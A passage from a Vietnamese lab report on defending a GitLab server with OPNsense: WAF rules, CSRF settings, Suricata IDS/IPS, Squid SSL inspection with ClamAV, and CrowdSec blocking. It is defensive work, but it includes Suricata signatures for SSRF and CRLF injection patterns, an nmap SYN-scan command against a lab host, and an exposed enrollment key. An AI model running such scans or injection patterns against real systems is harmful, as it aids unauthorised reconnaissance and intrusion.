\$arg_url sẽ kiểm tra các tham số URL đầu vào. Có thể thay bằng
\$request_body nếu cần lọc theo JSON body (với nginx lua module hoặc
WAF).

**5. Cấu hình Web Application Firewall (WAF)**

- **Sử dụng WAF**: Để bảo vệ hệ thống khỏi các tấn công web phổ biến,
  hãy triển khai một Web Application Firewall (WAF) như ModSecurity(coi
  chừng port trùng), Cloudflare WAF hoặc AWS WAF. WAF có thể giúp phát
  hiện và ngăn chặn các dấu hiệu của tấn công SSRF và CRLF injection(môi
  trường thật, domain thật).

Cài bộ rule OWASP CRS (Core Rule Set):

cd /etc/nginx/modsec/

git clone https://github.com/coreruleset/coreruleset.git

mv coreruleset/crs-setup.conf.example crs-setup.conf

Trong file /etc/nginx/modsec/main.conf:

Include /etc/nginx/modsec/crs-setup.conf

Include /etc/nginx/modsec/coreruleset/rules/\*.conf

**6. Đảm bảo an toàn CSRF**

- **CSRF Protection**: Đảm bảo rằng các trang đăng nhập và các yêu cầu
  quan trọng của GitLab đều có cơ chế bảo vệ CSRF hiệu quả. Điều này sẽ
  giúp ngăn cản việc kẻ tấn công có thể sử dụng CSRF token để giả mạo
  yêu cầu và thực thi các hành động không hợp lệ.

Ngăn chặn việc kẻ tấn công lợi dụng **trình duyệt người dùng đã đăng
nhập** để gửi các yêu cầu giả mạo đến GitLab, dẫn đến hành vi trái phép
như thay đổi mật khẩu, cấp quyền, xóa repo,\...

- CSRF là kiểu tấn công lợi dụng phiên đăng nhập hợp lệ của người dùng.

- Kẻ tấn công sẽ dẫn dụ người dùng click vào một link độc hại hoặc mở
  một trang giả mạo, từ đó thực hiện lệnh hành động thay mặt người dùng.

**GitLab đã có cơ chế CSRF Token tích hợp sẵn**

Mặc định, GitLab sử dụng Ruby on Rails, có hệ thống **CSRF token** mạnh
mẽ và tự động áp dụng cho mọi form và yêu cầu quan trọng
(POST/PUT/DELETE).

Tuy nhiên, cần đảm bảo:

- Không **tắt bảo vệ CSRF** qua config

- Tất cả các custom plugin/extension hoặc reverse proxy đều **không làm
  mất token**

Kiểm tra lại cấu hình GitLab không bỏ qua CSRF

Mở file /etc/gitlab/gitlab.rb (nếu dùng Omnibus), đảm bảo không có thiết
lập nào loại bỏ CSRF:

\# Không nên có các dòng như:

\# gitlab_rails\[\'allow_forgery_protection\'\] = false

Nếu có, phải sửa thành:

gitlab_rails\[\'allow_forgery_protection\'\] = true

Rồi chạy:

sudo gitlab-ctl reconfigure

**Reverse Proxy không xóa header**

Nếu bạn dùng Nginx/Apache reverse proxy, đảm bảo **header CSRF không bị
strip**.

Ví dụ Nginx proxy:

location / {

proxy_pass http://127.0.0.1:8080;

proxy_set_header X-Forwarded-For \$proxy_add_x_forwarded_for;

proxy_set_header X-CSRF-Token \$http_x_csrf_token; \# Giữ lại header
token

}

**7. Giới hạn quyền của người dùng**

- **Chỉ cấp quyền cần thiết**: Đảm bảo rằng người dùng và các nhóm trong
  GitLab chỉ có quyền truy cập vào các tài nguyên và chức năng cần thiết
  cho công việc của họ. Hạn chế quyền truy cập đối với các phần như
  CI/CD và các dự án có chứa mã nhạy cảm.

![](media/image47.png){width="6.5in" height="1.8270833333333334in"}

![](media/image48.png){width="6.5in" height="2.7111111111111112in"}

**8. Các phương pháp khác**

- **Phát hiện và chặn các IP đáng ngờ**: Sử dụng hệ thống IDS/IPS
  (Intrusion Detection/Prevention System) để phát hiện các địa chỉ IP
  đáng ngờ và chặn chúng trước khi chúng có thể gây hại.

**Bật IDS/IPS trong OPNsense**

Vào **Services \> Intrusion Detection \> Administration**:

- **Enable IDS**

- **Enable IPS (Inline blocking)** *(nếu bạn muốn chặn trực tiếp chứ
  không chỉ giám sát)*

IPS cần cấu hình **netmap** (interface phải hỗ trợ --- thường là em0,
igb0, re0,\...)  
→ Chọn **WAN** hoặc interface mà traffic đi qua.

**Tải và bật Rules**

Vào tab **Rules**, bật các bộ luật sau:

- **ET Open (free)**

- hoặc ET Pro (nếu bạn có subscription)

- Bật nhóm rules như:

  - **emerging-attack_response**

  - **emerging-malware**

  - **emerging-trojan**

  - **emerging-botcc**

  - **emerging-web_server**

  - **emerging-scan**

Tùy vào cấu trúc mạng, bạn có thể bật nhóm emerging-icmp, dos, v.v. cho
phù hợp.

![](media/image49.png){width="6.5in" height="0.6625in"}

- **Bảo vệ thư mục và tệp quan trọng**: Đảm bảo rằng các thư mục và tệp
  quan trọng trên server GitLab không bị truy cập trái phép qua các
  phương thức như SSRF. Cấu hình quyền truy cập tệp và thư mục nghiêm
  ngặt để chỉ cho phép người dùng hợp lệ.

- **Sử dụng clamAV:** Có thể sử dụng plugin ClamAV với các plugin khác
  như c-icap và rspamd để quét vi-rút. Nếu bạn đang dùng OPNsense như
  firewall hoặc proxy filter, ClamAV kết hợp với các rule (Squid,
  IDS/IPS, Suricata\...) sẽ tạo thành lớp bảo vệ chống malware theo tầng
  rất mạnh.

> **Cách triển khai**
>
> ![](media/image50.png){width="2.7625in" height="2.5319444444444446in"}
>
> Gõ tìm clamav và tải  
> ![](media/image51.png){width="6.5in" height="0.9229166666666667in"}
>
> Sau đó reboot hoặc đợi một chút
>
> ![](media/image52.png){width="3.854704724409449in"
> height="4.198502843394576in"}
>
> Nhấn vào và kích hoạt chữ ký (5-10 phút)
>
> Nếu có thể vào shell thì ta có thể gõ
>
> freshclam
>
> Để tiết kiệm thời gian
>
> ![](media/image53.png){width="6.5in" height="3.4506944444444443in"}
>
> Sau đó ta quay lại và kích hoạt như hình (default)  
> ![](media/image54.png){width="6.5in" height="3.1368055555555556in"}
>
> ![](media/image55.png){width="6.5in" height="2.935416666666667in"}
>
> ![](media/image56.png){width="6.5in" height="2.9340277777777777in"}
>
> Rồi lưu lại là xong

V.  []{#_Toc197592914 .anchor}Triển khai **c‑icap** và **ClamAV** nhằm
    thực hiện **SSL Inspection** phòng thủ đối với nội bộ

**Các bước triển khai Squid SSL Proxy trên OPNsense**

Dưới đây là hướng dẫn **từ đầu tới cuối** để cấu hình **Squid Proxy**
trên **OPNsense 25.1**, tích hợp với **c‑icap** và **ClamAV** nhằm thực
hiện **SSL Inspection** (Transparent HTTPS proxy + quét virus).

**Tóm tắt nhanh**

- Cài 3 plugin: **os‑squid**, **os‑c‑icap**, **os‑clamav**
  [docs.opnsense.org](https://docs.opnsense.org/plugins.html?utm_source=chatgpt.com)

- Tạo **Certificate Authority** nội bộ dùng cho SSL bump
  [docs.opnsense.org](https://docs.opnsense.org/manual/how-tos/proxytransparent.html)

- Bật **Transparent HTTP/HTTPS** proxy (SSL bump) trong Squid
  [docs.opnsense.org](https://docs.opnsense.org/manual/how-tos/proxytransparent.html)

- Tạo luật **NAT** để redirect port 80 → 3128, 443 → 3129
  [docs.opnsense.org](https://docs.opnsense.org/manual/how-tos/proxytransparent.html)

- Cấu hình **ICAP** để chuyển nội dung qua c‑icap
  [docs.opnsense.org](https://docs.opnsense.org/manual/how-tos/c-icap.html?utm_source=chatgpt.com)

- Bật **ClamAV** và cập nhật signatures
  [docs.opnsense.org](https://docs.opnsense.org/manual/antivirus.html?utm_source=chatgpt.com)

- Kiểm tra bằng **EICAR** và giám sát log

**Mục tiêu:**

1.  Dùng Squid để intercept HTTPS traffic (SSL bump)

2.  Gửi nội dung đến ICAP server (c-icap + ClamAV) để quét mã độc

3.  Không cần máy chủ phụ -- tất cả trên cùng một OPNsense

## **Cài đặt các plugin**

Vào **System \> Firmware \> Plugins**, cài 3 plugin sau (nếu chưa):

Trước tiên, bạn cần cài Squid trên OPNsense:

- **Bước 1**: Đăng nhập vào **OPNsense** qua web UI (ví dụ:
  https://192.168.1.20).

- **Bước 2**: Vào **System \> Firmware \> Plugins**.

- **Bước 3**: Tìm plugin os-squid và nhấn **+ Install**.

![](media/image57.png){width="6.5in" height="0.9444444444444444in"}

- **Bước 4:** Tìm plugin os-c-icap; os-clamav và nhấn **+ Install**.
  (gồm Squid + c-icap + ClamAV + giao diện cấu hình ICAP)

![](media/image58.png){width="6.5in" height="0.5930555555555556in"}

![](media/image59.png){width="6.5in" height="0.5208333333333334in"}

Sau khi cài xong, bạn sẽ thấy Squid và clamAV xuất hiện trong
**Services**.

![](media/image60.png){width="2.6597222222222223in"
height="3.5277777777777777in"}

**Lưu ý:** Plugin os-squidclamav *không còn được duy trì riêng*, vì chức
năng đã tích hợp vào os-c-icap + os-clamav.

## **Tạo Certificate Authority (CA) cho SSL Bump**

1.  Vào **System → Trust → Authorities → Add**
    [docs.opnsense.org](https://docs.opnsense.org/manual/how-tos/proxytransparent.html)

![](media/image61.png){width="6.493055555555555in"
height="1.7291666666666667in"}

2.  Điền:

    - **Descriptive name**: OPNsense SSL Inspection CA

    - **Method**: *Create internal Certificate Authority*

    - **Distinguished name** (Country, State, Org, Common Name...)

    - **Lifetime**: 3650 ngày

![](media/image62.png){width="6.5in" height="5.3277777777777775in"}

3.  Nhấn **Save** để lưu CA. Đây là CA mà Squid sẽ dùng để ký các chứng
    chỉ "bumped"
    [docs.opnsense.org](https://docs.opnsense.org/manual/how-tos/proxytransparent.html)

![](media/image63.png){width="6.5in" height="1.4166666666666667in"}

## **Cấu hình Squid làm Transparent Proxy và SSL Bump**

**3.1. Thiết lập cơ bản (Basic Proxy)**

1.  Vào **Services → Web Proxy → Administration → General Proxy
    Settings**

2.  ☑ **Enable proxy** → **Apply**
    [docs.opnsense.org](https://docs.opnsense.org/manual/how-tos/proxytransparent.html)

![](media/image64.png){width="6.5in" height="0.9756944444444444in"}

**3.2. Bật Transparent HTTP Proxy**

1.  Chuyển sang tab **Forward Proxy** → **General Forward Settings**

2.  ☑ **Enable Transparent HTTP proxy** → **Apply**
    [docs.opnsense.org](https://docs.opnsense.org/manual/how-tos/proxytransparent.html)

![](media/image65.png){width="6.5in" height="1.1875in"}

**3.3. Bật SSL Inspection (HTTPS / SSL Bump)**

1.  Vẫn trong **General Forward Settings**:

    - ☑ **Enable SSL mode**

    - **CA to use**: chọn OPNsense SSL Inspection CA

2.  Nhấn **Apply**
    [docs.opnsense.org](https://docs.opnsense.org/manual/how-tos/proxytransparent.html)

![](media/image66.png){width="6.493055555555555in"
height="2.8055555555555554in"}

**3.4. Tạo luật NAT chuyển traffic HTTP/HTTPS về Squid**

Nếu OPNsense chưa tự tạo, vào **Firewall → NAT → Port Forward** và thêm:

- **Rule HTTP**:

  - Interface: LAN

  - Protocol: TCP

  - Destination port: 80 → Redirect to 127.0.0.1:3128

![](media/image67.png){width="3.6590529308836395in"
height="3.5829811898512687in"}

- **Rule HTTPS**:

  - Interface: LAN

  - Protocol: TCP

  - Destination port: 443 → Redirect to 127.0.0.1:3129

- Source: LAN net, Destination: Any → Save & Apply
  [docs.opnsense.org](https://docs.opnsense.org/manual/how-tos/proxytransparent.html)

![](media/image68.png){width="3.293474409448819in"
height="3.259025590551181in"}

**3.5. Cấu hình danh sách "No SSL Bump" (không giải mã)**

1.  Trong **Forward Proxy → General Forward Settings**, bật **Advanced
    Mode**

2.  Thêm các host/nội dung không muốn bump (ví dụ: .paypal.com) vào
    **SSL no bump sites**
    [docs.opnsense.org](https://docs.opnsense.org/manual/how-tos/proxytransparent.html)

![](media/image69.png){width="6.5in" height="0.8298611111111112in"}

**3.6. Cài đặt chứng chỉ CA lên client**

1.  Vào **System → Trust → Authorities**, nhấn **Export** CA vừa tạo

![](media/image70.png){width="6.4875in" height="2.6729166666666666in"}

2.  Trên máy client, import vào **Trusted Root Certificate Authorities**
    để trình duyệt chấp nhận SSL Proxy

• Mở trình duyệt **Firefox**.

• Nhấn nút **☰** (ba gạch ngang) ở góc trên bên phải và chọn
**Options.**

![](media/image71.png){width="1.556492782152231in"
height="2.546991469816273in"}

• Trong menu bên trái, chọn **Advanced**.

![](media/image72.png){width="1.2618405511811024in"
height="2.1594641294838146in"}

• Chọn phần **Chứng chỉ** (*Certificates*) và nhấn nút **Xem chứng
chỉ\...** (*View Certificates\...*).

![](media/image73.png){width="2.907866360454943in"
height="1.9712182852143483in"}

• Chuyển sang tab **Cơ quan cấp chứng chỉ** (*Authorities*).

![](media/image74.png){width="3.6565879265091863in"
height="2.7686472003499563in"}

• Nhấn nút **Nhập\...** (*Import\...*).

• Duyệt đến vị trí lưu tệp chứng chỉ đã tải ở bước 1, chọn tệp và nhấn
**Mở** (*Open*).

![](media/image75.png){width="3.6768318022747155in"
height="2.7450535870516184in"}

• Trong hộp thoại hiện ra, đánh dấu vào ô **Tin tưởng CA này để xác định
các trang web** (*Trust this CA to identify websites*).

![](media/image76.png){width="3.7202679352580925in"
height="2.5831211723534557in"}

• Nhấn **OK** để hoàn tất.​

![](media/image77.png){width="3.966832895888014in"
height="2.1830293088363955in"}

## **Cấu hình ICAP (c‑icap)**

**4.1. Bật ICAP trong Squid**

Vào **Services → Web Proxy → Administration→Forward Proxy→ ICAP
Settings**, bật **Enable ICAP**

![](media/image78.png){width="3.8396741032370953in"
height="3.3375240594925635in"}

![](media/image79.png){width="6.208871391076116in"
height="1.466793525809274in"}

**4.2. Thiết lập URL cho REQMOD/RESPMOD**

- **Request Modify URL**:

> icap://127.0.0.1:1344/reqmod

- **Response Modify URL**:

> icap://127.0.0.1:1344/respmod
>
> ![](media/image80.png){width="4.864134951881015in"
> height="1.845877077865267in"}

Nhấn **Apply**

## **Cấu hình ClamAV**

**5.1. Bật dịch vụ clamd và freshclam**

Vào **Services → ClamAV**:

- ☑ **Enable clamd service**

- ☑ **Enable freshclam service (signature updates)**

- ☑ **Enable TCP Port** (mặc định port 3310)

![](media/image81.png){width="4.365042650918635in"
height="1.7977930883639546in"}

- Nhấn **Save**

**5.2. Tích hợp ClamAV với c‑icap**

Plugin **os-c-icap** mặc định đã cấu hình để dùng ClamAV tại
/usr/local/etc/c-icap/c-icap.conf

- Kiểm tra service tên srv_clamav trong file để chắc ClamAV được gọi
  đúng

![](media/image82.png){width="6.5in" height="2.970833333333333in"}

## **Khởi động và kiểm tra**

**6.1. Khởi động dịch vụ**

Truy cập **Dashboard → Services**, đảm bảo:

- Web Proxy đang chạy

- c-icap đang chạy

- clamd đang chạy
  [GitHub](https://github.com/opnsense/plugins/issues/3875?utm_source=chatgpt.com)

**6.2. Kiểm tra thực tế**

- **HTTP**: truy cập http://example.com → hiển thị bình thường qua proxy

- **HTTPS**: truy cập https://eicar.org/download/eicar.com.txt → Squid
  bump → ICAP gửi tới ClamAV → chặn file EICAR [Squid Web Cache
  wiki](https://wiki.squid-cache.org/ConfigExamples/ContentAdaptation/C-ICAP?utm_source=chatgpt.com)

![](media/image83.png){width="6.5in" height="3.6930555555555555in"}

- **Chạy script khai thác:** Khai thác từ ngoài vào và bị chặn lại bở
  firewall

![](media/image84.png){width="5.712810586176728in"
height="3.154251968503937in"}

![](media/image85.png){width="5.3640102799650045in"
height="3.0751367016622924in"}

![](media/image86.png){width="5.262443132108486in"
height="1.8486023622047245in"}

**6.3. Xem log**

- **Squid Access Log**: **Services → Web Proxy → Access Log**

- **c-icap log**: /var/log/c-icap/server.log

![](media/image87.png){width="6.5in" height="3.4541666666666666in"}

- **ClamAV log**: /var/log/clamav/clamd.log

![](media/image88.png){width="6.5in" height="2.9583333333333335in"}

## **Lưu ý & Tối ưu** {#lưu-ý-tối-ưu}

- **Bảo mật CA**: giữ khóa riêng an toàn, bổ sung cuối list "No SSL
  Bump" cho e‑banking
  [docs.opnsense.org](https://docs.opnsense.org/manual/how-tos/proxytransparent.html)

- **Theo dõi tài nguyên**: SSL bump tốn CPU/RAM, nên giám sát hiệu năng
  OPNsense

- **Kết hợp Suricata**: nếu cần IDS/IPS trên traffic đã decrypt, cài
  os-suricata, chọn interface LAN, bật rules TLS/HTTP
  [docs.opnsense.org](https://docs.opnsense.org/manual/how-tos/proxyicapantivirusinternal.html?utm_source=chatgpt.com)

VI. []{#_Toc197592922 .anchor}Phương pháp phòng thủ đối với ngoại vi

Việc chặn **người dùng nội bộ truy cập các liên kết độc hại** (như tải
EICAR test virus) là một phần quan trọng. Nhưng nếu muốn **chặn tấn công
từ bên ngoài (tấn công vào hệ thống)** thì cách tiếp cận sẽ **hoàn toàn
khác** --- ta không còn nói về **Squid Proxy**, mà sẽ phải triển khai
các công cụ **Network IDS/IPS**, **Firewall hardening**, **WAF**, hoặc
kết hợp **reverse proxy + sandboxing + deep packet inspection**.

1.  []{#_Toc197592923 .anchor}**Bật IDS/IPS với Suricata**

**Cấu hình chi tiết:**

- Truy cập: Services \> Intrusion Detection

- Tab: **Settings**

  - ✅ Bật IDS và IPS Mode

  - Interface: Chọn WAN (tức traffic từ ngoài vào)

  - ✅ Promiscuous mode

  - Chọn Hyperscan nếu hỗ trợ CPU

![](media/image89.png){width="6.5in" height="2.4in"}

- Tab: **Download**

  - Chọn rule set (ví dụ: **ET Open**, **Snort GPL**, hoặc **PT Rules**)

  - Bấm **Download & Update Rules**

![](media/image90.png){width="6.5in" height="2.607638888888889in"}

- Tab: **Rules**

  - Bật các rule theo dõi exploit, malware, scan, brute-force, v.v.

![](media/image91.png){width="6.5in" height="1.9631944444444445in"}

IDS/IPS sẽ giúp chặn tấn công SQLi, XSS, bruteforce, scanning, malware
từ **internet vào nội bộ**.

Tạo 1 rule arlert scan nmap từ bên ngoài vào sv nội bộ

Tạo 1 bộ rule đơn giản

customnmap.rules

alert tcp any any -\> 192.168.1.30 any (msg:\"\[LOCAL\] NMAP SYNSTEALTH
SCAN DETECTED\"; flow:stateless; flags:S; threshold:type both, track
by_src, count 50, seconds 1; classtype:attempted-recon; sid:1234;
rev:1;)

drop tcp any any -\> 192.168.1.30 any (msg:\"\[DROP\] NMAP SYNSTEALTH
SCAN DETECTED\"; flow:stateless; flags:S; threshold:type both, track
by_src, count 50, seconds 1; classtype:attempted-recon; sid:1234;
rev:2;)

alert http any any -\> any any (msg:\"GITLAB SSRF/CRLF Exploit
Attempt\"; flow:to_server,established; content:\"import_url\";
http_client_body; content:\"127.0.0.1\"; nocase;
classtype:web-application-attack; sid:1000001; rev:1;)

alert http any any -\> any any (msg:\"CRLF Injection Attempt\";
flow:to_server,established; content:\"%0d%0a\"; http_uri;
classtype:web-application-attack; sid:1000002; rev:1;)dùng filezilla bỏ
file customrules.xml vô thư mục IPS của firewall

\<?xml version=\"1.0\"?\>

\<ruleset documentation_url=\"http://docs.opnsense.org/\"\>

\<location url=\"http://192.168.1.30:81/\" prefix=\"customnmap\"/\>

\<files\>

\<file description=\"customnmap rules\"\>customnmap.rules\</file\>

\<file description=\"customnmap\" url=\"inline::
rules/customnmap.rules\"\>customnmap.rules\</file\>

\</files\>

\</ruleset\>

![](media/image92.png){width="6.5in" height="4.3902777777777775in"}

Mở port

ubuntu@mail:\~/Downloads\$ sudo python3 -m http.server 81

Serving HTTP on 0.0.0.0 port 81 (http://0.0.0.0:81/) \...

192.168.1.20 - - \[23/Apr/2025 14:07:55\] \"GET /customnmap.rules
HTTP/1.1\" 200 -

Sau đó cập nhật lại rule

![](media/image93.png){width="6.5in" height="1.79375in"}

Xong qua tab Rules để kiểm tra đã enable chưa

![](media/image94.png){width="6.5in" height="1.2930555555555556in"}

Bây giờ tiến hành kiểm tra

Dùng kali scan thử

nmap -sS -Pn \--top-ports 500 192.168.1.30

![](media/image95.png){width="6.5in" height="2.7944444444444443in"}

![](media/image96.png){width="6.5in" height="2.792361111111111in"}

2.  []{#_Toc197592924 .anchor}**Cấu hình Firewall Rule cho WAN**

- Truy cập: Firewall \> Rules \> WAN

- Xóa hết các rule \"Allow All\" mặc định nếu có.

- Tạo các rule cụ thể:

  - Chỉ cho phép port cần thiết (443/80 cho Web Server, 22 nếu cần
    SSH\...).

  - Block toàn bộ còn lại.

Nguyên tắc: **Mặc định chặn - Chỉ cho những gì cần.**

3.  []{#_Toc197592925 .anchor}**Sử dụng Reverse Proxy (HAProxy/NGINX) để
    lọc traffic vào**

- Cài plugin os-haproxy trên OPNsense.

- Dùng HAProxy làm cổng chặn đầu tiên:

  - Lọc Host, Header, User-Agent bất thường.

  - Giới hạn số kết nối.

  - Thêm chứng chỉ SSL riêng, ẩn backend thật.

  - Tích hợp Fail2Ban hoặc geo-block.

4.  []{#_Toc197592926 .anchor}**Giám sát và phân tích log real-time**

- Cài plugin os-graylog hoặc chuyển log đến ELK stack để phân tích.

- Thiết lập cảnh báo khi:

  - Có brute-force login

  - Lưu lượng bất thường (DoS)

  - Truy cập từ IP đáng ngờ

5.  []{#_Toc197592927 .anchor}**Chặn IP/mạng nguy hiểm (Reputation
    Filtering)**

- Dùng plugin:

  - os-abuseipdb

  - os-crowdsec (đề xuất mạnh)

- Tự động cập nhật danh sách IP tấn công từ cộng đồng.

- Block các IP nguy hiểm tại **Firewall \> Aliases \> GeoIP/IP List**

từng bước để **cài đặt và cấu hình CrowdSec** trên **OPNsense 25.1**,
bao gồm cả **plugin**, **thiết lập** (IDS, LAPI, Bouncer), **luật
firewall**, **whitelist**, **blocklist** và **kiểm thử** hoạt động.

### **Cài đặt plugin CrowdSec**

**Qua giao diện Web UI**

1.  Truy cập **System → Firmware → Plugins** trên giao diện OPNsense

2.  Gõ "os-crowdsec" vào ô tìm kiếm → click **+ Install** bên cạnh
    os-crowdsec
    [Zenarmor](https://www.zenarmor.com/docs/network-security-tutorials/how-to-install-and-configure-crowdsec-on-opnsense).

3.  Hệ thống tự động deploy ba gói: os-crowdsec, crowdsec,
    crowdsec-firewall-bouncer

- os-crowdsec (giao diện plugin)

- crowdsec (agent)

- crowdsec-firewall-bouncer (bouncer)
  [Zenarmor](https://www.zenarmor.com/docs/network-security-tutorials/how-to-install-and-configure-crowdsec-on-opnsense).

![](media/image97.png){width="6.5in" height="1.8534722222222222in"}

**Qua CLI (OPNsense 22.1 trở lên)**

pkg install os-crowdsec-devel

Lưu ý: Nếu /var đang chạy trên RAMdisk, tắt RAMdisk cho /var trước khi
cài để CrowdSec lưu database [Documentation \|
CrowdSec](https://docs.crowdsec.net/docs/getting_started/install_crowdsec_opnsense/?utm_source=chatgpt.com).

### **Cấu hình dịch vụ CrowdSec**

1.  Vào **Services → CrowdSec → Settings**

2.  Tại tab **Settings**, đánh dấu:

    - ☑ **Enable CrowdSec (IDS)**

    - ☑ **Enable LAPI (Local API)**

    - ☑ **Enable Firewall Bouncer (IPS)**

    - (Tuỳ chọn) ☑ **Enable log for rules** để ghi log chi tiết các rule
      block.

![](media/image98.png){width="6.5in" height="3.3583333333333334in"}

3.  Nhấn **Apply** để áp dụng cấu hình.

### **Xem luật và alias do CrowdSec sinh tự động**

- Vào **Firewall → Rules → Floating** để xem các **floating rules** chặn
  IPv4/IPv6 mà CrowdSec đã tạo

![](media/image99.png){width="6.5in" height="3.4243055555555557in"}

- Vào **Firewall → Aliases** sẽ thấy hai alias: crowdsec_blacklists và
  crowdsec6_blacklists

![](media/image100.png){width="6.5in" height="2.484722222222222in"}

### **Thêm luật Firewall chặn outbound IP độc hại**

1.  Vào **Firewall → Rules → Floating**, nhấn **+ Add** (phía trên bên
    phải)

2.  Chọn:

    - **Action**: Block

    - **Interface**: LAN (hoặc VLAN cần bảo vệ)

    - **Direction**: In

    - **Destination**: Chọn alias crowdsec_blacklists

![Adding firewall rule-1](media/image101.png){width="6.5in"
height="6.5in"}

3.  (Tuỳ chọn) Tick **Log packets** để ghi log rõ ràng.

4.  Ghi **Description** (ví dụ: Block truy cập IP độc hại).

![](media/image102.png){width="6.5in" height="3.4055555555555554in"}

5.  Nhấn **Save** → **Apply Changes**

![](media/image103.png){width="6.5in" height="2.4569444444444444in"}

### **Tạo tài khoản quản lý trên CrowdSec Console (tuỳ chọn)**

1.  Đăng ký tại <https://app.crowdsec.net/signup>

![](media/image104.png){width="6.5in" height="3.5416666666666665in"}

2.  Sau khi verify email, đăng nhập để lấy **mã enrollment** (ở trang
    Engines).

![](media/image105.png){width="6.5in" height="3.071527777777778in"}

![](media/image106.png){width="6.5in" height="3.1993055555555556in"}

3.  Trên OPNsense SSH, chạy:

> sudo cscli console enroll -e context cm9sdmol10003jy08x26knwin
>
> ![](media/image107.png){width="6.5in" height="4.209027777777778in"}

4.  Trên Console, bấm **Accept enroll** và reload dịch vụ:

> service crowdsec reload
>
> \`\`\` :contentReference\[oaicite:22\]{index=22}.
>
> ![](media/image108.png){width="6.5in" height="4.055555555555555in"}
>
> service crowdsec reload
>
> ![](media/image109.png){width="6.5in" height="1.1708333333333334in"}

### **Thêm Private IP vào whitelist**

CrowdSec có thể block nhầm IP nội bộ nếu phát hiện hành vi giống
brute‑force.

1.  SSH vào OPNsense, chạy:

> cscli parsers install crowdsecurity/whitelists
>
> service crowdsec reload
>
> ![](media/image110.png){width="6.5in" height="1.9125in"}

2.  File YAML mẫu nằm tại /usr/local/etc/crowdsec/parsers/... với CIDR
    như 192.168.0.0/16, 10.0.0.0/8...

![](media/image111.png){width="6.5in" height="2.176388888888889in"}

![](media/image112.png){width="6.5in" height="0.47152777777777777in"}

Sau đó lưu lại và thoát ra reload

sudo service crowdsec reload

**Kiểm tra danh sách parser** để đảm bảo tệp whitelist đã được nạp:

cscli parsers list

![](media/image113.png){width="6.5in" height="1.5930555555555554in"}

- Trạng thái tainted chỉ là cảnh báo rằng parser đã được chỉnh sửa cục
  bộ và sẽ không được cập nhật tự động. Nếu bạn hài lòng với các chỉnh
  sửa và không cần cập nhật từ CrowdSec Hub, bạn có thể bỏ qua cảnh báo
  này.

- Nếu bạn muốn parser được cập nhật tự động trong tương lai, hãy sử dụng
  phương pháp tạo tệp .local hoặc parser tùy chỉnh như hướng dẫn ở trên.

**Kiểm tra quyết định (decisions)** để đảm bảo IP không bị chặn:

cscli decisions list

![](media/image114.png){width="6.5in" height="0.7055555555555556in"}

### **Bổ sung Additional Blocklists từ CrowdSec Hub**

1.  Trên **CrowdSec Console → Account → Security Engines → Blocklists**.

2.  Chọn danh sách (ví dụ ) → **+ Add Security Engine(s)** → **Save**.

![](media/image115.png){width="6.5in" height="3.4833333333333334in"}

3.  Trên OPNsense, alias mới sẽ xuất hiện tự động dưới **Firewall →
    Aliases**

4.  (Tuỳ chọn) Tạo rule tương tự bước 5 để chặn outbound qua alias đó.

### **Kiểm thử hoạt động**

1.  Trên OPNsense SSH, chạy:

> cscli decisions add -t ban -d 2m -i 192.168.1.30
>
> → Phiên SSH sẽ bị kick, chứng tỏ Bouncer hoạt động
>
> ![](media/image116.png){width="6.5in" height="0.9208333333333333in"}

2.  Quan sát trên **Services → CrowdSec → Overview → Alerts** để thấy
    event ban

![](media/image117.png){width="6.5in" height="4.956944444444445in"}

Gỡ ban

cscli decisions delete \--ip 192.168.1.30

![](media/image118.png){width="6.5in" height="4.104166666666667in"}

![](media/image119.png){width="6.5in" height="4.4in"}

Dùng máy kali từ bên ngoài brute-force SSH hoặc scan port đến OPNsense

VII. []{#_Toc197592936 .anchor}Tài liệu tham khảo

[[Blog
CNTT]{.underline}](https://blogcntt.com/huong-dan-them-root-certificate-tren-windows/?utm_source=chatgpt.com)

<https://github.com/DsonSolo/Configuring-Opnsense-antivirus-with-C-ICAP-and-ClamAV>

<https://docs.opnsense.org/manual/how-tos/self-signed-chain.html>

<https://docs.crowdsec.net/docs/next/getting_started/install_crowdsec_opnsense/>
